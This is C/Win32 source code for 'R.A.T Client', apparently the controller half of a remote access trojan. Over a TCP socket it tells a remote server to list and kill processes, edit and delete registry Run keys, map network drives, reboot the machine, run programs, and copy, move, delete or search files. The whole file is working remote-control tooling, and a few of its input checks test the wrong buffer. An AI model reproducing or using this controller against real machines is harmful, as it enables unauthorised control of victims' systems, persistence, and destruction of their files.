#include <windows.h>
#include <commctrl.h>
#include <stdio.h>
#include "rat_types.h"
#include "resource.h"
#include "error.h"
#include "mystr.h"

#define		PROCS		0
#define		REG			1
#define		NET			2
#define		SYS			3
#define		FILES		4

HOOKPROC hkprcSysMsg; 
static HINSTANCE hinstDLL; 
static HHOOK hhookSysMsg; 
char		buf[255];
char		buf2[255];
char		buf3[255];
DWORD		RegKey_Top;
SOCKADDR_IN	RemAdr;
SOCKET		hSock;
WORD		Event;
PACKETHEAD	Head;
DWORD		HeadSize=sizeof(PACKETHEAD);
BOOL		Synchro=1,WaitForData=0,ItemSelected=0;
DWORD		ConRes;
DWORD		OUTPUT_ID;
BYTE		CurMang=0;
HINSTANCE	_hInst;
char		*RecvBuf;

 
void SetLog(HWND hwnd,char *op,char *res)
{
	LV_ITEM	item;
	item.mask=TVIF_TEXT;
	item.iItem=0;
	item.iSubItem=0;
	item.pszText=op;
	item.iItem=ListView_InsertItem(GetDlgItem(hwnd,ID_OUTPUT),&item);
	item.iSubItem=1;
	item.pszText=res;
	ListView_SetItem(GetDlgItem(hwnd,ID_OUTPUT),&item);
}

void InitWSA()
{
	WORD	wVersionRequested;
	WSADATA wsaData;
	int		err;
	wVersionRequested = MAKEWORD( 2, 0 );
    err = WSAStartup( wVersionRequested, &wsaData );
    if ( err != 0 )
		PostQuitMessage(1);

    if ( LOBYTE( wsaData.wVersion ) != 2 ||
		 HIBYTE( wsaData.wVersion ) != 0 )
	{
	    WSACleanup();
		PostQuitMessage(0);
	}
}

void CloseSocket()
{
	closesocket(hSock);
	WSACleanup();
}

void SetButtons(HWND hwnd)
{
	LV_COLUMN	col;
	for (int cnt=0; cnt<6; cnt++)
	{
		LoadString(_hInst,(cnt+1)+CurMang*6,buf,255);
		SetWindowText(GetDlgItem(hwnd,ID_CMD1+cnt),buf);
	}
	LoadString(_hInst,31+CurMang,buf,255);
	SetWindowText(GetDlgItem(hwnd,ID_CAPTION),buf);
	LoadString(_hInst,36+CurMang*2,buf,255);
	col.mask=LVCF_TEXT|LVCF_WIDTH;
	col.cx=100;
	col.pszText=buf;
	ListView_SetColumn(GetDlgItem(hwnd,ID_PROCS),0,&col);
	col.cx=450;
	LoadString(_hInst,37+CurMang*2,buf,255);
	col.pszText=buf;
	ListView_SetColumn(GetDlgItem(hwnd,ID_PROCS),1,&col);
}

LRESULT CALLBACK InputPara(HWND hwnd,UINT Mes,UINT wPar,LONG lPar)
{
	switch(Mes)
	{
	case WM_INITDIALOG:
		return true;
		break;
	case WM_COMMAND:
		switch(LOWORD(wPar))
		{
		case ID_OK:
			GetWindowText(GetDlgItem(hwnd,ID_PARAM),buf,255);
			if (!buf[0])
			{
				MessageBox(0,"Need not empty parametr","R.A.T Client",0);
				break;
			}
			EndDialog(hwnd,1);
			break;
		}
		break;
	}
	return false;
}

LRESULT CALLBACK InputPara2(HWND hwnd,UINT Mes,UINT wPar,LONG lPar)
{
	switch(Mes)
	{
	case WM_INITDIALOG:
		return true;
		break;
	case WM_COMMAND:
		switch(LOWORD(wPar))
		{
		case ID_OK:
			GetWindowText(GetDlgItem(hwnd,ID_PARA1),buf,255);
			if (!buf[0])
			{
				MessageBox(0,"Need not empty source name","R.A.T Client",0);
				break;
			}
			GetWindowText(GetDlgItem(hwnd,ID_PARA2),buf2,255);
			if (!buf[0])
			{
				MessageBox(0,"Need not empty destination name","R.A.T Client",0);
				break;
			}
			EndDialog(hwnd,1);
			break;
		case ID_CANCEL:
			EndDialog(hwnd,0);
			break;
		}
		break;
	}
	return false;
}

LRESULT CALLBACK InputReg(HWND hwnd,UINT Mes,UINT wPar,LONG lPar)
{
	switch(Mes)
	{
	case WM_INITDIALOG:
		if (ItemSelected)
		{
			DWORD pos=GetCharPos(buf,'\\',DOWN)+1;
			strncpy(buf2,buf,pos);
			buf2[pos]=0;
			PanString(buf,pos);
			SetWindowText(GetDlgItem(hwnd,ID_RUNPATH),buf2);
			SetWindowText(GetDlgItem(hwnd,ID_RUNNAME),buf);
		}
		RegKey_Top=(DWORD)HKEY_LOCAL_MACHINE;
		SendMessage(GetDlgItem(hwnd,ID_HKLM),BM_SETCHECK,1,0);
		ItemSelected^=ItemSelected;
		return true;
		break;
	case WM_COMMAND:
		switch(LOWORD(wPar))
		{
		case ID_HKCR:	RegKey_Top=(DWORD)HKEY_CLASSES_ROOT; break;
		case ID_HKLM:	RegKey_Top=(DWORD)HKEY_LOCAL_MACHINE; break;
		case ID_HKU:	RegKey_Top=(DWORD)HKEY_USERS; break;
		case ID_HKCU:	RegKey_Top=(DWORD)HKEY_CURRENT_USER; break;
		case ID_OK:
			GetWindowText(GetDlgItem(hwnd,ID_RUNPATH),buf,255);
			if (!buf[0])
			{
				MessageBox(0,"Need not empty key path","R.A.T Client",0);
				break;
			}
			GetWindowText(GetDlgItem(hwnd,ID_RUNNAME),buf2,255);
			if (!buf2[0])
			{
				MessageBox(0,"Need not empty key name","R.A.T Client",0);
				break;
			}
			GetWindowText(GetDlgItem(hwnd,ID_KEYVAL),buf3,255);
			if (!buf2[0])
			{
				MessageBox(0,"Need not empty key value","R.A.T Client",0);
				break;
			}
			EndDialog(hwnd,1);
			break;
		}
		break;
		case ID_CANCEL:
			EndDialog(hwnd,0);
			break;
	}
	return false;
}

LRESULT CALLBACK InputConDrv(HWND hwnd,UINT Mes,UINT wPar,LONG lPar)
{
	switch(Mes)
	{
	case WM_INITDIALOG:
		return true;
		break;
	case WM_COMMAND:
		switch(LOWORD(wPar))
		{
		case ID_OK:
			GetWindowText(GetDlgItem(hwnd,ID_DRVPATH),buf,255);
			if (!buf[0])
			{
				MessageBox(0,"Need not empty drive path","R.A.T Client",0);
				break;
			}
			GetWindowText(GetDlgItem(hwnd,ID_NAME),buf2,255);
			if (!buf2[0])
			{
				MessageBox(0,"Need not empty user name","R.A.T Client",0);
				break;
			}
			GetWindowText(GetDlgItem(hwnd,ID_PASSWORD),buf3,255);
			EndDialog(hwnd,1);
			break;
		case ID_CANCEL:
			EndDialog(hwnd,0);
			break;
		}
		break;
	}
	return false;
}

LRESULT CALLBACK MainWndProc(HWND hwnd,UINT Mes,UINT wPar,LONG lPar)
{
	LV_COLUMN	col;
	LV_ITEM		item;

	switch(Mes)
	{
	case WM_INITDIALOG:  
		InitWSA();
		CurMang=PROCS;
		col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=100;
		col.pszText="";
		ListView_InsertColumn(GetDlgItem(hwnd,ID_PROCS),0,&col);
		col.cx=450;
		col.pszText="";
		ListView_InsertColumn(GetDlgItem(hwnd,ID_PROCS),1,&col);
		SetButtons(hwnd);
		SetWindowText(GetDlgItem(hwnd,ID_PORT),"1024");
		SetWindowText(GetDlgItem(hwnd,ID_SERVER),"127.0.0.1");
		SetWindowText(GetDlgItem(hwnd,ID_PASSWORD),"Password");
		col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=270;
		col.pszText="Operation";
		ListView_InsertColumn(GetDlgItem(hwnd,ID_OUTPUT),0,&col);
		col.pszText="Result";
		ListView_InsertColumn(GetDlgItem(hwnd,ID_OUTPUT),1,&col);
		return true;
		break;
	case RATMSG_SOCKET:
		Event=WSAGETSELECTEVENT(lPar);
		switch(Event)
		{
		case FD_CONNECT:
			SetLog(hwnd,"Connection to server","OK");
			break;
		case FD_CLOSE:
			SetLog(hwnd,"Connection to server","Closed");
			Synchro^=Synchro;
			WaitForData^=WaitForData;
			closesocket(hSock);
			break;
		case FD_READ:
			if (Synchro)
			{
				recv(hSock,(char*)&Head,HeadSize,0);
				if ((Head.PacketType==PACK_TYPE_SYNCHRO)&&(Head.DataSize=SYNCHRO_SIGN)&&(Synchro))
				{
					GetWindowText(GetDlgItem(hwnd,ID_PASSWORD),buf,255);
					Head.PacketType=PACK_TYPE_SYNCHRO;
					Head.DataSize=lstrlen(buf)+1;
					send(hSock,(char*)&Head,HeadSize,0);
					send(hSock,buf,lstrlen(buf)+1,0);
					Synchro^=1;
				}
				break;
			}
			if (!WaitForData)
			{
				recv(hSock,(char*)&Head,HeadSize,0);
				if ((Head.DataSize>4)&&(Head.PacketType>=PACK_MIN)&&(Head.PacketType<=PACK_MAX))
					WaitForData^=1;
			}
			else
			{
				DWORD	pos;
				char	pid[255];
				char	path[255];
				item.iItem=0;
				item.iSubItem=0;
				RecvBuf=(char*)GlobalAlloc(GMEM_FIXED,Head.DataSize);
				recv(hSock,RecvBuf,Head.DataSize,0);
				pos=GetCharPos(RecvBuf,'\t',UP);
				strncpy(pid,RecvBuf,pos);
				pid[pos]=0;
				PanString(RecvBuf,pos+1);
				strcpy(path,RecvBuf);
				item.pszText=(char*)GlobalAlloc(GMEM_FIXED,255);
				lstrcpy(item.pszText,pid);
				item.mask=LVIF_TEXT;
				item.cchTextMax=lstrlen(pid);
				item.iItem=ListView_InsertItem(GetDlgItem(hwnd,OUTPUT_ID),&item);
				item.iSubItem=1;
				item.pszText=path;
				item.cchTextMax=lstrlen(path);
				ListView_SetItem(GetDlgItem(hwnd,OUTPUT_ID),&item);
				GlobalFree(RecvBuf);
				GlobalFree(item.pszText);
				WaitForData^=1;
			}
			break;
		}
		break;
	case WM_COMMAND: 
		switch(LOWORD(wPar))
		{
		case ID_CONNECT:
			GetWindowText(GetDlgItem(hwnd,ID_SERVER),buf,255);
			RemAdr.sin_family = AF_INET;
			RemAdr.sin_addr.s_addr=inet_addr(buf);
			GetWindowText(GetDlgItem(hwnd,ID_PORT),buf,255);
			RemAdr.sin_port = htons (atoi(buf));
			hSock = socket (AF_INET,SOCK_STREAM,0);
			ConRes=connect (hSock, (struct sockaddr *)&RemAdr,sizeof(RemAdr));
			if (ConRes==-1)
			{
				SetLog(hwnd,"Connectiong ot server","Fail");
				break;
			}
			WSAAsyncSelect(hSock,hwnd,RATMSG_SOCKET,FD_READ|FD_CLOSE|FD_CONNECT);
			break;
		case ID_PROCESSES:
			CurMang=PROCS;
			SetButtons(hwnd);
			break;
		case ID_REGISTRY:
			CurMang=REG;
			SetButtons(hwnd);
			break;
		case ID_NETWORK:
			CurMang=NET;
			SetButtons(hwnd);
			break;
		case ID_SYSTEM:
			CurMang=SYS;
			SetButtons(hwnd);
			break;
		case ID_FILES:
			CurMang=FILES;
			SetButtons(hwnd);
			break;
		case ID_CMD1:
			switch(CurMang)
			{
			case PROCS:					// Refresh
				OUTPUT_ID=ID_PROCS;
				ListView_DeleteAllItems(GetDlgItem(hwnd,OUTPUT_ID));
				Head.PacketType=PACK_TYPE_CMD_PROCLIST;
				Head.DataSize=1;
				send(hSock,(char*)&Head,HeadSize,0);
				if (send(hSock,buf,1,0)!=-1)
					SetLog(hwnd,"Process list","Packet sent");
				break;
			case REG:					// List
				OUTPUT_ID=ID_PROCS;
				ListView_DeleteAllItems(GetDlgItem(hwnd,OUTPUT_ID));
				Head.PacketType=PACK_TYPE_CMD_REGLIST;
				Head.DataSize=1;
				send(hSock,(char*)&Head,HeadSize,0);
				if (send(hSock,buf,1,0)!=-1)
					SetLog(hwnd,"Registry run list","Packet sent");
				break;
			case NET:					// Show shared disks
				OUTPUT_ID=ID_PROCS;
				ListView_DeleteAllItems(GetDlgItem(hwnd,OUTPUT_ID));
				Head.PacketType=PACK_TYPE_CMD_SHOWSHARED;
				Head.DataSize=1;
				send(hSock,(char*)&Head,HeadSize,0);
				if (send(hSock,buf,1,0)!=-1)
					SetLog(hwnd,"Show shared resources","Packet sent");
				break;
			case SYS:					// Reboot
				if (MessageBox(0,"WARNING!\nSending this message reboots remote machine! Proceed?","R.A.T Client",MB_YESNO|MB_ICONWARNING)==IDYES)
				{
					Head.PacketType=PACK_TYPE_CMD_REBOOT;
					Head.DataSize=1;
					send(hSock,(char*)&Head,HeadSize,0);
					if (send(hSock,buf,1,0)!=-1)
						SetLog(hwnd,"Reboot remote machine","Packet sent");
				}
				break;
			}
			break;
		case ID_CMD2:
			switch(CurMang)
			{
			case PROCS:					// Terminate
				OUTPUT_ID=ID_PROCS;
				Head.PacketType=PACK_TYPE_CMD_TERMINATE;
				item.iItem=ListView_GetNextItem(GetDlgItem(hwnd,OUTPUT_ID),-1,LVNI_SELECTED);
				item.mask=LVIF_TEXT;
				item.iSubItem=0;
				item.pszText=(char*)GlobalAlloc(GMEM_FIXED,255);
				item.cchTextMax=255;
				ListView_GetItem(GetDlgItem(hwnd,OUTPUT_ID),&item);
				Head.DataSize=lstrlen(item.pszText)+1;
				send(hSock,(char*)&Head,HeadSize,0);
				if (send(hSock,item.pszText,Head.DataSize,0)!=-1)
					SetLog(hwnd,"Terminate process","Packet sent");
				GlobalFree(item.pszText);
				OUTPUT_ID=ID_OUTPUT;
				break;
			case REG:						// Delete reg key
				OUTPUT_ID=ID_PROCS;
				Head.PacketType=PACK_TYPE_CMD_REGDELETE;
				item.iItem=ListView_GetNextItem(GetDlgItem(hwnd,OUTPUT_ID),-1,LVNI_SELECTED);
				item.mask=LVIF_TEXT;
				item.iSubItem=0;
				item.pszText=(char*)GlobalAlloc(GMEM_FIXED,255);
				item.cchTextMax=255;
				ListView_GetItem(GetDlgItem(hwnd,OUTPUT_ID),&item);
				Head.DataSize=lstrlen(item.pszText)+1;
				send(hSock,(char*)&Head,HeadSize,0);
				if (send(hSock,item.pszText,Head.DataSize,0)!=-1)
					SetLog(hwnd,"Registry key delete","Packet sent");
				GlobalFree(item.pszText);
				OUTPUT_ID=ID_OUTPUT;
				break;
			case NET:							// Show connected
				OUTPUT_ID=ID_PROCS;				
				ListView_DeleteAllItems(GetDlgItem(hwnd,OUTPUT_ID));
				Head.PacketType=PACK_TYPE_CMD_SHOWCONN;
				Head.DataSize=1;
				send(hSock,(char*)&Head,HeadSize,0);
				if (send(hSock,buf,Head.DataSize,0)!=-1)
					SetLog(hwnd,"Show connected drives","Packet sent");
				break;
			case FILES:
				{
					OUTPUT_ID=ID_OUTPUT;			// Copy
					if (!DialogBox(_hInst,"INPUT2PAR",hwnd,(DLGPROC)InputPara2))
						break;
					char *out=(char*)GlobalAlloc(GMEM_FIXED,lstrlen(buf)+lstrlen(buf2)+5);
					wsprintf(out,"%s\t%s",buf,buf2);
					Head.PacketType=PACK_TYPE_CMD_COPY;
					Head.DataSize=lstrlen(out);
					send(hSock,(char*)&Head,HeadSize,0);
					if (send(hSock,out,Head.DataSize,0)!=-1)
						SetLog(hwnd,"Copy file","Packet sent");
					GlobalFree(out);
				}
				break;
			case SYS:
				OUTPUT_ID=ID_PROCS;
				ListView_DeleteAllItems(GetDlgItem(hwnd,ID_PROCS));
				Head.PacketType=PACK_TYPE_CMD_SYSINFO;
				Head.DataSize=1;
				send(hSock,(char*)&Head,HeadSize,0);
				if (send(hSock,buf,1,0)!=-1)
					SetLog(hwnd,"System info","Packet sent");
				break;
			}
			break;
		case ID_CMD3:
			switch(CurMang)
			{
			case PROCS:							// Run program
				OUTPUT_ID=ID_OUTPUT;				
				Head.PacketType=PACK_TYPE_CMD_RUN;
				if (!DialogBox(_hInst,"INPUT",hwnd,(DLGPROC)InputPara))
					break;
				Head.DataSize=lstrlen(buf)+1;
				send(hSock,(char*)&Head,HeadSize,0);
				if (send(hSock,buf,Head.DataSize,0)!=-1)
					SetLog(hwnd,"Run program","Packet sent");
				break;
			case REG:							// Reg insert
				{
					OUTPUT_ID=ID_OUTPUT;				
					Head.PacketType=PACK_TYPE_CMD_REGADD;
					item.iItem=ListView_GetNextItem(GetDlgItem(hwnd,ID_PROCS),-1,LVNI_SELECTED);
					if (item.iItem!=-1)
					{
						item.mask=LVIF_TEXT;
						item.iSubItem=0;
						item.pszText=(char*)GlobalAlloc(GMEM_FIXED,255);
						item.cchTextMax=255;
						ListView_GetItem(GetDlgItem(hwnd,ID_PROCS),&item);
						lstrcpy(buf,item.pszText);
						ItemSelected=1;
					}
					if (!DialogBox(_hInst,"REGADD",hwnd,(DLGPROC)InputReg))
					{
						GlobalFree(item.pszText);
						break;
					}
					char *out=(char*)GlobalAlloc(GMEM_FIXED,lstrlen(buf)+lstrlen(buf2)+lstrlen(buf3)+10);
					wsprintf(out,"%lu\t%s\t%s\t%s",RegKey_Top,buf,buf2,buf3);
					Head.DataSize=lstrlen(out)+1;
					send(hSock,(char*)&Head,HeadSize,0);
					if (send(hSock,out,Head.DataSize,0)!=-1)
						SetLog(hwnd,"Registry key add","Packet sent");
					GlobalFree(out);
					GlobalFree(item.pszText);
				}
				break;
			case NET:							// disconnect
				OUTPUT_ID=ID_PROCS;
				Head.PacketType=PACK_TYPE_CMD_DISCONNDRV;
				item.iItem=ListView_GetNextItem(GetDlgItem(hwnd,ID_PROCS),-1,LVNI_SELECTED);
				item.iSubItem=1;
				item.mask=TVIF_TEXT;
				item.pszText=(char*)GlobalAlloc(GMEM_FIXED,255);
				ListView_GetItem(GetDlgItem(hwnd,ID_PROCS),&item);
				Head.DataSize=lstrlen(item.pszText)+1;
				send(hSock,(char*)&Head,HeadSize,0);
				if (send(hSock,item.pszText,Head.DataSize,0)!=-1)
					SetLog(hwnd,"Disconnect drive","Packet sent");
				GlobalFree(item.pszText);
				OUTPUT_ID=ID_OUTPUT;
				break;
			case FILES:						// Move
				{
					OUTPUT_ID=ID_OUTPUT;
					if (!DialogBox(_hInst,"INPUT2PAR",hwnd,(DLGPROC)InputPara2))
						break;
					char *out=(char*)GlobalAlloc(GMEM_FIXED,lstrlen(buf)+lstrlen(buf2)+5);
					wsprintf(out,"%s\t%s",buf,buf2);
					Head.PacketType=PACK_TYPE_CMD_MOVE;
					Head.DataSize=lstrlen(out);
					send(hSock,(char*)&Head,HeadSize,0);
					if (send(hSock,out,Head.DataSize,0)!=-1)
						SetLog(hwnd,"Move file","Packet sent");
					GlobalFree(out);
				}
			}
			break;
		case ID_CMD4:
			switch(CurMang)
			{
			case PROCS:
				break;
			case REG:
				break;
			case NET:				// Connect remote drive
				{
					OUTPUT_ID=ID_OUTPUT;				
					Head.PacketType=PACK_TYPE_CMD_CONNDRIVE;
					if (!DialogBox(_hInst,"CONNECTDRV",hwnd,(DLGPROC)InputConDrv))
						break;
					char *out=(char*)GlobalAlloc(GMEM_FIXED,lstrlen(buf)+lstrlen(buf2)+lstrlen(buf3)+5);
					wsprintf(out,"%s\t%s\t%s",buf,buf2,buf3);
					Head.DataSize=lstrlen(out)+1;
					send(hSock,(char*)&Head,HeadSize,0);
					if (send(hSock,out,Head.DataSize,0)!=-1)
						SetLog(hwnd,"Connect drive","Packet sent");
					GlobalFree(out);
					break;
				}
			case FILES:						// delete
				OUTPUT_ID=ID_OUTPUT;
				if (!DialogBox(_hInst,"INPUT",hwnd,(DLGPROC)InputPara))
					break;
				Head.PacketType=PACK_TYPE_CMD_DELETE;
				Head.DataSize=lstrlen(buf)+1;
				send(hSock,(char*)&Head,HeadSize,0);
				if (send(hSock,buf,Head.DataSize,0)!=-1)
					SetLog(hwnd,"Delete file","Packet sent");
				break;
			} 
			break;
		case ID_CMD5:
			switch(CurMang)
			{
			case PROCS:
				break;
			case REG:
				break;
			case NET:
				break;
			case FILES:
				break;
			}
			break;
		case ID_CMD6:
			switch(CurMang)
			{
			case PROCS:
				break;
			case REG:
				break;
			case NET: 
				break;
			case FILES:						// find files
				OUTPUT_ID=ID_PROCS;
				ListView_DeleteAllItems(GetDlgItem(hwnd,ID_PROCS));
				if (!DialogBox(_hInst,"INPUT",hwnd,(DLGPROC)InputPara))
					break;
				Head.PacketType=PACK_TYPE_CMD_FIND;
				Head.DataSize=lstrlen(buf)+1;
				send(hSock,(char*)&Head,HeadSize,0);
				if (send(hSock,buf,Head.DataSize,0)!=-1)
					SetLog(hwnd,"Find files","Packet sent");
				break;
			}
			break;
		case ID_CLEARLOG:
			ListView_DeleteAllItems(GetDlgItem(hwnd,ID_OUTPUT));
			break;
		} break;
	case WM_SYSCOMMAND:
		switch (wPar)
        {
        case SC_CLOSE:
			CloseSocket();
/*			UnhookWindowsHookEx(hhookSysMsg);
			FreeLibrary(hinstDLL);*/
			PostQuitMessage(0);
            break;
        } break;
	}
	return false;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
				   LPSTR lpszParam, int nCmdShow)
{
	_hInst=hInst;
	InitCommonControls();
	DialogBox(hInst,"MAIN",0,(DLGPROC)MainWndProc);
	return 0;
}